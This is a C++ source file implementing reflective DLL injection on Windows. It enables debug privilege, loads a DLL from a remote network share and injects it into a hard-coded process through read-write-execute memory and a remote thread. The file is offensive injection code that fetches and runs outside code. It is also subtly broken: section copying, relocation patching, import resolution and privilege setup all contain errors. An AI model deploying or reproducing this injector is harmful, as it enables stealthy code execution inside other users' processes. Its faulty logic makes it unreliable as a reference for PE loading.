// Reflective DLL Injection.cpp : This file contains the 'main' function. Program execution begins and ends there.
#include <iostream>
#include<Windows.h>

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);

BOOL EnableWindowsPrivilege(const WCHAR* Privilege)
{
    /* Tries to enable privilege if it is present to the Permissions set. */
    LUID luid = {};
    TOKEN_PRIVILEGES tp;
    HANDLE currentProcess = GetCurrentProcess();
    HANDLE currentToken = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!LookupPrivilegeValue(NULL, Privilege, &luid))
        return FALSE;

    if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken))
        return FALSE;

    if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        return FALSE;

    return TRUE;
}

bool ReflectiveDLLInjection(DWORD target_pid) {    
    HANDLE hDLL = CreateFileA("\\\\192.168.122.1\\share\\tmp.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
    if (hDLL == INVALID_HANDLE_VALUE) {
        return false;
    }

    //Allocate Heap for DLL to be saved in memory
    DWORD size = GetFileSize(hDLL, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) {
        return false;
    }
    //open handle to remote process
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, target_pid);
    if (hProcess == INVALID_HANDLE_VALUE) {
        return false;
    }

    //save DLL content inside heap
    LPVOID buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    ReadFile(hDLL, buffer, size, NULL, NULL);

    //now buffer points to the first byte of DLL.
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)buffer + dos_header->e_lfanew); //error
    DWORD optional_header_size = nt_header->OptionalHeader.SizeOfImage;

    //get .edata section address
    IMAGE_DATA_DIRECTORY export_table = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)buffer + export_table.VirtualAddress);

    PWORD functions = (PWORD)((LPBYTE)buffer + export_dir->AddressOfFunctions);
    PWORD names = (PWORD)((LPBYTE)buffer + export_dir->AddressOfNames);
    PWORD ordinals = (PWORD)((LPBYTE)buffer + export_dir->AddressOfNameOrdinals);

    //Allocate memory inside the process
    LPVOID base_addr = VirtualAllocEx(hProcess, NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (!base_addr) {
        return false;
    }
    // Get address delta between base address of DLL and the DLL that was read into memory.
    DWORD_PTR address_delta = (DWORD_PTR)base_addr - (DWORD_PTR)nt_header->OptionalHeader.ImageBase;

    //We will fill the newly allocated memory using memcpy
    WriteProcessMemory(hProcess,base_addr, buffer, nt_header->OptionalHeader.SizeOfHeaders,NULL);

    //We get the first section and save it in section
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_header);

    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
        // We get the address for section by address base addr with VirtualAddress of the section.
        LPVOID section_dest = (LPVOID)((LPBYTE)base_addr + section->VirtualAddress);
        // We now get the pointer to raw bytes of section by adding base addr with PointerToRawData section.
        LPVOID sectionBytes = (LPVOID)((LPBYTE)base_addr + section->PointerToRawData);
        // We now copy the sectionBytes into sections inside the base_addr memory 
        WriteProcessMemory(hProcess,section_dest, sectionBytes, section->SizeOfRawData,NULL);
        section++;
    }

    //Lets get address of the reallocation base and change the realloc table by adding the delta of address with the address in the offset field of .realloc section.
    IMAGE_DATA_DIRECTORY reallocation = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD_PTR reallocation_table = (DWORD_PTR)base_addr + reallocation.VirtualAddress;
    DWORD reallocations_done = 0;
    while (reallocations_done < reallocation.Size) {
        PBASE_RELOCATION_BLOCK reallocation_block = (PBASE_RELOCATION_BLOCK)(reallocation_table+reallocations_done);
        reallocations_done += sizeof(BASE_RELOCATION_BLOCK);
        DWORD reallocation_counts = (reallocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY reallocationentry = (PBASE_RELOCATION_ENTRY)(reallocation_table + reallocations_done);

        for (DWORD i = 0; i < reallocation_counts; i++) {
            reallocations_done += sizeof(BASE_RELOCATION_ENTRY);
            //If type is 0 then reallocation is ignored so move to next type.
            if (reallocationentry[i].Type == 0) {
                continue;
            }
            // Refer to image to understand this. This is pure gold move here..
            DWORD_PTR reallocation_RVA = reallocation_block->PageAddress + reallocationentry[i].Offset;
            DWORD_PTR address_to_patch = 0;
            WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)base_addr + reallocation_RVA), &address_to_patch, sizeof(DWORD_PTR), NULL);
            address_to_patch += address_delta;
            WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)base_addr + reallocation_RVA), &address_to_patch, sizeof(DWORD_PTR), NULL);
        }
    }
    
    //build up IAT 
    IMAGE_DATA_DIRECTORY import_table = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    PIMAGE_IMPORT_DESCRIPTOR import_address = (PIMAGE_IMPORT_DESCRIPTOR)(import_table.VirtualAddress + (DWORD_PTR)base_addr);

    // Iterate via all imported method names
    while (import_address->Name != NULL) {
        LPCSTR LibraryName = (LPCSTR)(import_address->Name + (DWORD_PTR)base_addr);
        HMODULE library = LoadLibraryA(LibraryName);
        if (library) {
            // Thunk are small peice of code that is called as function and it does something but returns back to another function instead of returning to its caller.
            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)base_addr + import_address->FirstThunk);
            while (thunk->u1.AddressOfData != NULL) {
                // To check if the method is imported by ordinal, and if yes get the address of method by passing ordinal value.
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                    LPCSTR functionOrd = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrd);
                }
                else {
                    // Method is imported using name, so get the function name and find the address using that to update IAT table.
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)base_addr + thunk->u1.AddressOfData);
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionName->Name);
                }
                thunk++;
            }
        }
        import_address++;
    }

    CreateRemoteThread(hProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)base_addr, NULL, NULL, NULL);
    WaitForSingleObject(NULL, 0xFFFFFF);
    //DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)base_addr + nt_header->OptionalHeader.AddressOfEntryPoint);
    //(*DllEntry)((HINSTANCE)base_addr, DLL_PROCESS_ATTACH, 0);
    CloseHandle(hDLL);
    HeapFree(GetProcessHeap(), 0, buffer);
    return true;
}

int main(int argc,char* argv[])
{
    int target_pid = 772;
    //if (argc == 1)
    //    target_pid = atoi(argv[1]);
    //else
    //    target_pid = GetCurrentProcessId();

    // Enable SeDebugPrivilege in current process to open handle to remote process
    if (!EnableWindowsPrivilege(SE_DEBUG_NAME)) {
        return -1;
    }

    bool status = ReflectiveDLLInjection(target_pid);

    if (status)
        return 0;
    else
        return -1;
}
